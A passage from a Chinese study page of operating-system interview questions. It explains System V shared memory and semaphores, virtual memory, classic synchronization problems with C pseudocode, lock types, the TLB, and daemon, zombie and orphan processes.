flag);</p><p>成功时返回一个和key相关的共享内存标识符，失败范湖范围-1。</p><ul><li><p>key：为共享内存段命名，多个共享同一片内存的进程使用同一个key。</p></li><li><p>size：共享内存容量。</p></li><li><p>flag：权限标志位，和open的mode参数一样。</p></li></ul></li><li><p>连接到共享内存地址空间：void <em>shmat(int shmid, void </em>addr, int flag);</p><p>返回值即共享内存实际地址。</p><ul><li><p>shmid：shmget()返回的标识。</p></li><li><p>addr：决定以什么方式连接地址。</p></li><li><p>flag：访问模式。</p></li></ul></li><li><p>从共享内存分离：int shmdt(const void *shmaddr);</p><p>调用成功返回0，失败返回-1。</p><ul><li>shmaddr：是shmat()返回的地址指针。</li></ul></li></ul></li><li><p>其他补充</p><p>共享内存的方式像极了多线程中线程对全局变量的访问，大家都对等地有权去修改这块内存的值，这就导致在多进程并发下，最终结果是不可预期的。所以对这块临界区的访问需要通过信号量来进行进程同步。</p><p>但共享内存的优势也很明显，首先可以通过共享内存进行通信的进程不需要像无名管道一样需要通信的进程间有亲缘关系。其次内存共享的速度也比较快，不存在读取文件、消息传递等过程，只需要到相应映射到的内存地址直接读写数据即可。</p></li></ul><p><strong>信号量</strong></p><p>在提到共享内存方式时也提到，进程共享内存和多线程共享全局变量非常相似。所以在使用内存共享的方式是也需要通过信号量来完成进程间同步。多线程同步的信号量是POSIX信号量，而在进程里使用SYSTEM  V信号量。</p><ul><li><p>相关接口</p><ul><li><p>创建信号量：int semget(key_t key, int nsems, int semflag);</p><p>创建成功返回信号量标识符，失败返回-1。</p><ul><li><p>key：进程pid。</p></li><li><p>nsems：创建信号量的个数。</p></li><li><p>semflag：指定信号量读写权限。</p></li></ul></li><li><p>改变信号量值：int semop(int semid, struct sembuf *sops, unsigned nsops);</p><p>我们所需要做的主要工作就是串讲sembuf变量并设置其值，然后调用semop，把设置好的sembuf变量传递进去。</p><p>struct sembuf结构体定义如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sembuf</span><span class="token punctuation">&#123;</span>    <span class="token keyword">short</span> sem_num<span class="token punctuation">;</span>    <span class="token keyword">short</span> sem_op<span class="token punctuation">;</span>    <span class="token keyword">short</span> sem_flg<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>成功返回信号量标识符，失败返回-1。</p><ul><li><p>semid：信号量集标识符，由semget()函数返回。</p></li><li><p>sops：指向struct sembuf结构的指针，先设置好sembuf值再通过指针传递。</p></li><li><p>nsops：进行操作信号量的个数，即sops结构变量的个数，需大于或等于1。最常见设置此值等于1，只完成对一个信号量的操作。</p></li></ul></li><li><p>直接控制信号量信息：int semctl(int semid, int semnum, int cmd, union semun arg);</p><ul><li><p>semid：信号量集标识符。</p></li><li><p>semnum：信号量集数组上的下标，表示某一个信号量。</p></li><li><p>arg：union semun类型。</p></li></ul></li></ul></li></ul><p><strong>辅助命令</strong></p><p>ipcs命令用于报告共享内存、信号量和消息队列信息。</p><ul><li><p>ipcs -a：列出共享内存、信号量和消息队列信息。</p></li><li><p>ipcs -l：列出系统限额。</p></li><li><p>ipcs -u：列出当前使用情况。</p></li></ul><p><strong>套接字</strong></p><p>与其它通信机制不同的是，它可用于不同机器间的进程通信。</p><h4 id="20、虚拟内存的目的是什么？"><a href="#20、虚拟内存的目的是什么？" class="headerlink" title="20、虚拟内存的目的是什么？"></a>20、虚拟内存的目的是什么？</h4><p>虚拟内存的目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存。</p><p>为了更好的管理内存，操作系统将内存抽象成地址空间。每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。</p><p>这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到不在物理内存中的页时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。</p><p>从上面的描述中可以看出，虚拟内存允许程序不用将地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行，这使得有限的内存运行大程序成为可能。</p><p>例如有一台计算机可以产生 16 位地址，那么一个程序的地址空间范围是 0~64K。该计算机只有 32KB 的物理内存，虚拟内存技术允许该计算机运行一个 64K 大小的程序。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226235441.png" alt=""></p><h4 id="21、说一下你理解中的内存？他有什么作用呢？"><a href="#21、说一下你理解中的内存？他有什么作用呢？" class="headerlink" title="21、说一下你理解中的内存？他有什么作用呢？"></a>21、说一下你理解中的内存？他有什么作用呢？</h4><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/20190606083123966.png" alt=""></p><h4 id="22、操作系统经典问题之哲学家进餐问题"><a href="#22、操作系统经典问题之哲学家进餐问题" class="headerlink" title="22、操作系统经典问题之哲学家进餐问题"></a>22、操作系统经典问题之哲学家进餐问题</h4><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226230619.png" alt=""></p><p>五个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。</p><p>下面是一种错误的解法，如果所有哲学家同时拿起左手边的筷子，那么所有哲学家都在等待其它哲学家吃完并释放自己手中的筷子，导致死锁。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">5</span></span></span><span class="token keyword">void</span> <span class="token function">philosopher</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">think</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">take</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 拿起左边的筷子</span>        <span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 拿起右边的筷子</span>        <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">put</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">put</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>为了防止死锁的发生，可以设置两个条件：</p><ul><li>必须同时拿起左右两根筷子；</li><li>只有在两个邻居都没有进餐的情况下才允许进餐。</li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">5</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LEFT</span> <span class="token expression"><span class="token punctuation">(</span>i <span class="token operator">+</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> N </span><span class="token comment">// 左邻居</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RIGHT</span> <span class="token expression"><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> N    </span><span class="token comment">// 右邻居</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">THINKING</span> <span class="token expression"><span class="token number">0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">HUNGRY</span>   <span class="token expression"><span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">EATING</span>   <span class="token expression"><span class="token number">2</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">int</span> semaphore<span class="token punctuation">;</span><span class="token keyword">int</span> state<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token comment">// 跟踪每个哲学家的状态</span>semaphore mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment">// 临界区的互斥，临界区是 state 数组，对其修改需要互斥</span>semaphore s<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>              <span class="token comment">// 每个哲学家一个信号量</span><span class="token keyword">void</span> <span class="token function">philosopher</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">think</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">take_two</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">eat</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">put_two</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">take_two</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> HUNGRY<span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 只有收到通知之后才可以开始吃，否则会一直等下去</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">put_two</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> THINKING<span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span>LEFT<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 尝试通知左右邻居，自己吃完了，你们可以开始吃了</span>    <span class="token function">check</span><span class="token punctuation">(</span>RIGHT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> EATING<span class="token punctuation">;</span>    <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 检查两个邻居是否都没有用餐，如果是的话，就 up(&amp;s[i])，使得 down(&amp;s[i]) 能够得到通知并继续执行</span><span class="token keyword">void</span> <span class="token function">check</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span>state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> HUNGRY <span class="token operator">&amp;&amp;</span> state<span class="token punctuation">[</span>LEFT<span class="token punctuation">]</span> <span class="token operator">!=</span> EATING <span class="token operator">&amp;&amp;</span> state<span class="token punctuation">[</span>RIGHT<span class="token punctuation">]</span> <span class="token operator">!=</span>EATING<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> EATING<span class="token punctuation">;</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="23、操作系统经典问题之读者-写者问题"><a href="#23、操作系统经典问题之读者-写者问题" class="headerlink" title="23、操作系统经典问题之读者-写者问题"></a>23、操作系统经典问题之读者-写者问题</h4><p>允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。</p><p>一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">int</span> semaphore<span class="token punctuation">;</span>semaphore count_mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>semaphore data_mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">reader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data_mutex<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 第一个读者需要对数据进行加锁，防止写进程访问</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        count<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data_mutex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//最后一个读者要对数据进行解锁，防止写进程无法访问</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">down</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data_mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data_mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="24、介绍一下几种典型的锁"><a href="#24、介绍一下几种典型的锁" class="headerlink" title="24、介绍一下几种典型的锁"></a>24、介绍一下几种典型的锁</h4><p><strong>读写锁</strong></p><ul><li>多个读者可以同时进行读</li><li>写者必须互斥（只允许一个写者写，也不能读者写者同时进行）</li><li>写者优先于读者（一旦有写者，则后续读者必须等待，唤醒时优先考虑写者）</li></ul><p><strong>互斥锁</strong></p><p>一次只能一个线程拥有互斥锁，其他线程只有等待</p><p>互斥锁是在抢锁失败的情况下主动放弃CPU进入睡眠状态直到锁的状态改变时再唤醒，而操作系统负责线程调度，为了实现锁的状态发生改变时唤醒阻塞的线程或者进程，需要把锁交给操作系统管理，所以互斥锁在加锁操作时涉及上下文的切换。互斥锁实际的效率还是可以让人接受的，加锁的时间大概100ns左右，而实际上互斥锁的一种可能的实现是先自旋一段时间，当自旋的时间超过阀值之后再将线程投入睡眠中，因此在并发运算中使用互斥锁（每次占用锁的时间很短）的效果可能不亚于使用自旋锁</p><p><strong>条件变量</strong></p><p>互斥锁一个明显的缺点是他只有两种状态：锁定和非锁定。而条件变量通过允许线程阻塞和等待另一个线程发送信号的方法弥补了互斥锁的不足，他常和互斥锁一起使用，以免出现竞态条件。当条件不满足时，线程往往解开相应的互斥锁并阻塞线程然后等待条件发生变化。一旦其他的某个线程改变了条件变量，他将通知相应的条件变量唤醒一个或多个正被此条件变量阻塞的线程。总的来说<strong>互斥锁是线程间互斥的机制，条件变量则是同步机制。</strong></p><p><strong>自旋锁</strong></p><p>如果进线程无法取得锁，进线程不会立刻放弃CPU时间片，而是一直循环尝试获取锁，直到获取为止。如果别的线程长时期占有锁，那么自旋就是在浪费CPU做无用功，但是自旋锁一般应用于加锁时间很短的场景，这个时候效率比较高。</p><blockquote><p>《互斥锁、读写锁、自旋锁、条件变量的特点总结》：<a href="https://blog.csdn.net/RUN32875094/article/details/80169978">https://blog.csdn.net/RUN32875094/article/details/80169978</a></p></blockquote><ol><li><p>线程（POSIX）锁有哪些？</p><ul><li><p>互斥锁（mutex）</p><ul><li>互斥锁属于sleep-waiting类型的锁。例如在一个双核的机器上有两个线程A和B，它们分别运行在core 0和core 1上。假设线程A想要通过pthread_mutex_lock操作去得到一个临界区的锁，而此时这个锁正被线程B所持有，那么线程A就会被阻塞，此时会通过上下文切换将线程A置于等待队列中，此时core 0就可以运行其他的任务（如线程C）。</li></ul></li><li><p>条件变量(cond)</p></li><li><p>自旋锁(spin)</p><ul><li><p>自旋锁属于busy-waiting类型的锁，如果线程A是使用pthread_spin_lock操作去请求锁，如果自旋锁已经被线程B所持有，那么线程A就会一直在core 0上进行忙等待并不停的进行锁请求，检查该自旋锁是否已经被线程B释放，直到得到这个锁为止。因为自旋锁不会引起调用者睡眠，所以自旋锁的效率远高于互斥锁。</p></li><li><p>虽然它的效率比互斥锁高，但是它也有些不足之处：</p><ul><li><p>自旋锁一直占用CPU，在未获得锁的情况下，一直进行自旋，所以占用着CPU，如果不能在很短的时间内获得锁，无疑会使CPU效率降低。</p></li><li><p>在用自旋锁时有可能造成死锁，当递归调用时有可能造成死锁。</p></li></ul></li><li><p>自旋锁只有在内核可抢占式或SMP的情况下才真正需要，在单CPU且不可抢占式的内核下，自旋锁的操作为空操作。自旋锁适用于锁使用者保持锁时间比较短的情况下。</p></li></ul></li></ul></li></ol><h4 id="25、逻辑地址VS物理地址"><a href="#25、逻辑地址VS物理地址" class="headerlink" title="25、逻辑地址VS物理地址"></a>25、逻辑地址VS物理地址</h4><p>Eg:编译时只需确定变量x存放的相对地址是100 ( 也就是说相对于进程在内存中的起始地址而言的地址)。CPU想要找到x在内存中的实际存放位置，只需要用进程的起始地址+100即可。<br>相对地址又称逻辑地址，绝对地址又称物理地址。</p><h4 id="26、怎么回收线程？有哪几种方法？"><a href="#26、怎么回收线程？有哪几种方法？" class="headerlink" title="26、怎么回收线程？有哪几种方法？"></a>26、怎么回收线程？有哪几种方法？</h4><ul><li><p>等待线程结束：int pthread_join(pthread_t tid, void** retval);</p><p>主线程调用，等待子线程退出并回收其资源，类似于进程中wait/waitpid回收僵尸进程，调用pthread_join的线程会被阻塞。</p><ul><li><p>tid：创建线程时通过指针得到tid值。</p></li><li><p>retval：指向返回值的指针。</p></li></ul></li><li><p>结束线程：pthread_exit(void *retval);</p><p>子线程执行，用来结束当前线程并通过retval传递返回值，该返回值可通过pthread_join获得。</p><ul><li>retval：同上。</li></ul></li><li><p>分离线程：int pthread_detach(pthread_t tid);</p><p>主线程、子线程均可调用。主线程中pthread_detach(tid)，子线程中pthread_detach(pthread_self())，调用后和主线程分离，子线程结束时自己立即回收资源。</p><ul><li>tid：同上。</li></ul></li></ul><h4 id="27、内存的覆盖是什么？有什么特点？"><a href="#27、内存的覆盖是什么？有什么特点？" class="headerlink" title="27、内存的覆盖是什么？有什么特点？"></a>27、内存的覆盖是什么？有什么特点？</h4><p>由于程序运行时并非任何时候都要访问程序及数据的各个部分（尤其是大程序），因此可以把用户空间分成为一个固定区和若干个覆盖区。将经常活跃的部分放在固定区，其余部分按照调用关系分段，首先将那些即将要访问的段放入覆盖区，其他段放在外存中，在需要调用前，系统将其调入覆盖区，替换覆盖区中原有的段。</p><p>覆盖技术的特点：是打破了必须将一个进程的全部信息装入内存后才能运行的限制，但当同时运行程序的代码量大于主存时仍不能运行，再而，大家要注意到，内存中能够更新的地方只有覆盖区的段，不在覆盖区的段会常驻内存。</p><h4 id="28、内存交换是什么？有什么特点？"><a href="#28、内存交换是什么？有什么特点？" class="headerlink" title="28、内存交换是什么？有什么特点？"></a>28、内存交换是什么？有什么特点？</h4><p><strong>交换(对换)技术的设计思想</strong>：内存空间紧张时，系统将内存中某些进程暂时换出外存，把外存中某些已具备运行条件的进程换入内存(进程在内存与磁盘间动态调度)</p><p>换入：把准备好竞争CPU运行的程序从辅存移到内存。<br>换出：把处于等待状态（或CPU调度原则下被剥夺运行权力）的程序从内存移到辅存，把内存空间腾出来。</p><h4 id="29、什么时候会进行内存的交换？"><a href="#29、什么时候会进行内存的交换？" class="headerlink" title="29、什么时候会进行内存的交换？"></a>29、什么时候会进行内存的交换？</h4><p>内存交换通常在许多进程运行且内存吃紧时进行，而系统负荷降低就暂停。例如:在发现许多进程运行时经常发生缺页，就说明内存紧张，此时可以换出一些进程;如果缺页率明显下降，就可以暂停换出。</p><h4 id="30、终端退出，终端运行的进程会怎样"><a href="#30、终端退出，终端运行的进程会怎样" class="headerlink" title="30、终端退出，终端运行的进程会怎样"></a>30、终端退出，终端运行的进程会怎样</h4><p>终端在退出时会发送SIGHUP给对应的bash进程，bash进程收到这个信号后首先将它发给session下面的进程，如果程序没有对SIGHUP信号做特殊处理，那么进程就会随着终端关闭而退出</p><blockquote><p>《linux终端关闭时为什么会导致在其上启动的进程退出？》：<a href="https://blog.csdn.net/QFire/article/details/80112701">https://blog.csdn.net/QFire/article/details/80112701</a></p></blockquote><h4 id="31、如何让进程后台运行"><a href="#31、如何让进程后台运行" class="headerlink" title="31、如何让进程后台运行"></a>31、如何让进程后台运行</h4><p>（1）命令后面加上&amp;即可，实际上，这样是将命令放入到一个作业队列中了</p><p>（2）ctrl + z 挂起进程，使用jobs查看序号，在使用bg %序号后台运行进程</p><p>（3）nohup + &amp;，将标准输出和标准错误缺省会被重定向到 nohup.out 文件中，忽略所有挂断（SIGHUP）信号</p><p>（4）运行指令前面 + setsid，使其父进程编程init进程，不受HUP信号的影响</p><p>（5）将 命令+ &amp;放在()括号中，也可以是进程不受HUP信号的影响</p><h4 id="32、什么是快表，你知道多少关于快表的知识？"><a href="#32、什么是快表，你知道多少关于快表的知识？" class="headerlink" title="32、什么是快表，你知道多少关于快表的知识？"></a>32、什么是快表，你知道多少关于快表的知识？</h4><p>快表，又称联想寄存器(TLB) ，是一种访问速度比内存快很多的高速缓冲存储器，用来存放当前访问的若干页表项，以加速地址变换的过程。与此对应，内存中的页表常称为慢表。</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/QQ截图20210226212752.png" alt=""></p><h4 id="33、地址变换中，有快表和没快表，有什么区别？"><a href="#33、地址变换中，有快表和没快表，有什么区别？" class="headerlink" title="33、地址变换中，有快表和没快表，有什么区别？"></a>33、地址变换中，有快表和没快表，有什么区别？</h4><div class="table-container"><table><thead><tr><th></th><th>地址变换过程</th><th>访问一个逻辑地址的访存次数</th></tr></thead><tbody><tr><td>基本地址变换机构</td><td>①算页号、页内偏移量 ②检查页号合法性 ③查页表，找到页面存放的内存块号 ④根据内存块号与页内偏移量得到物理地址 ⑤访问目标内存单元</td><td>两次访存</td></tr><tr><td>具有快表的地址变换机构</td><td>①算页号、页内偏移量 ②检查页号合法性 ③查快表。若命中，即可知道页面存放的内存块号，可直接进行⑤;若未命中则进行④ ④查页表，找到页面存放的内存块号，并且将页表项复制到快表中 ⑤根据内存块号与页内偏移量得到物理地址 ⑥访问目标内存单元</td><td>快表命中，只需一次访存 快表未命中，需要两次访存</td></tr></tbody></table></div><h4 id="35、-守护进程、僵尸进程和孤儿进程"><a href="#35、-守护进程、僵尸进程和孤儿进程" class="headerlink" title="35、 守护进程、僵尸进程和孤儿进程"></a>35、 守护进程、僵尸进程和孤儿进程</h4><p><strong>守护进程</strong></p><p>指在后台运行的，没有控制终端与之相连的进程。它独立于控制终端，周期性地执行某种任务。Linux的大多数服务器就是用守护进程的方式实现的，如web服务器进程http等</p><p>创建守护进程要点：</p><p>（1）让程序在后台执行。方法是调用fork（）产生一个子进程，然后使父进程退出。</p><p>（2）调用setsid（）创建一个新对话期。控制终端、登录会话和进程组通常是从父进程继承下来的，守护进程要摆脱它们，不受它们的影响，方法是调用setsid（）使进程成为一个会话组长。setsid（）调用成功后，进程成为新的会话组长和进程组长，并与原来的登录会话、进程组和控制终端脱离。</p><p>（3）禁止进程重新打开控制终端。经过以上步骤，进程已经成为一个无终端的会话组长，但是它可以重新申请打开一个终端。为了避免这种情况发生，可以通过使进程不再是会话组长来实现。再一次通过fork（）创建新的子进程，使调用fork的进程退出。</p><p>（4）关闭不再需要的文件描述符。子进程从父进程继承打开的文件描述符。如不关闭，将会浪费系统资源，造成进程所在的文件系统无法卸下以及引起无法预料的错误。首先获得最高文件描述符值，然后用一个循环程序，关闭0到最高文件描述符值的所有文件描述符。</p><p>（5）将当前目录更改为根目录。</p><p>（6）子进程从父进程继承的文件创建屏蔽字可能会拒绝某些许可权。为防止这一点，使用unmask（0）将屏蔽字清零。</p><p>（7）处理SIGCHLD信号。对于服务器进程，在请求到来时往往生成子进程处理请求。如果子进程等待父进程捕获状态，则子进程将成为僵尸进程（zombie），从而占用系统资源。如果父进程等待子进程结束，将增加父进程的负担，影响服务器进程的并发性能。在Linux下可以简单地将SIGCHLD信号的操作设为SIG_IGN。这样，子进程结束时不会产生僵尸进程。</p><p><strong>孤儿进程</strong></p><p>如果父进程先退出，子进程还没退出，那么子进程的父进程将变为init进程。（注：任何一个进程都必须有父进程）。</p><p> 一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。 </p><p><strong>僵尸进程</strong></p><p>如果子进程先退出，父进程还没退出，那么子进程必须等到父进程捕获到了子进程的退出状态才真正结束，否则这个时候子进程就成为僵尸进程。</p><p>设置<strong>僵尸进程的目</strong>的是维护子进程的信息，以便父进程在以后某个时候获取。这些信息至少包括进程ID，进程的终止状态，以及该进程使用的CPU时间，所以当终止子进程的父进程调用wait或waitpid时就可以得到这些信息。如果一个进程终止，而该进程有子进程处于僵尸状态，那么它的所有僵尸子进程的父进程ID将被重置为1（init进程）。继承这些子进程的init进程将清理它们（也就是说init进程将wait它们，从而去除它们的僵尸状态）。</p><h4 id="36、如何避免僵尸进程？"><a href="#36、如何避免僵尸进程？" class="headerlink" title="36、如何避免僵尸进程？"></a>36、如何避免僵尸进程？</h4><ul><li><p>通过signal(SIGCHLD, SIG_IGN)通知内核对子进程的结束不关心，由内核回收。如果不想让父进程挂起，可以在父进程中加入一条语句：signal(SIGCHLD,SIG_IGN);表示父进程忽略SIGCHLD信号，该信号是子进程退出的时候向父进程发送的。</p></li><li><p>父进程调用wait/waitpid等函数等待子进程结束，如果尚无子进程退出wait会导致父进程阻塞。waitpid可以通过传递WNOHANG使父进程不阻塞立即返回。</p></li><li>如果父进程很忙可以用signal注册信号处理函数，在信号处理函数调用wait/waitpid等待子进程退出。</li><li>通过两次调用fork。父进程首先调用fork创建一个子进程然后waitpid等待子进程退出，子进程再fork一个孙进程后退出。这样子进程退出后会被父进程等待回收，而对于孙子进程其父进程已经退出所以孙进程成为一个孤儿进程，孤儿进程由init进程接管，孙进程结束后，init会等待回收。</li></ul><p>第一种方法忽略SIGCHLD信号，这常用于并发服务器的性能的一个技巧因为并发服务器常常fork很多子进程，子进程终结之后需要服务器进程去wait清理资源。如果将此信号的处理方式设为忽略，可让内核把僵尸子进程转交给init进程去处理，省去了大量僵尸进程占用系统资源。</p><blockquote><p>《Linux系统下创建守护进程(Daemon)》：<a 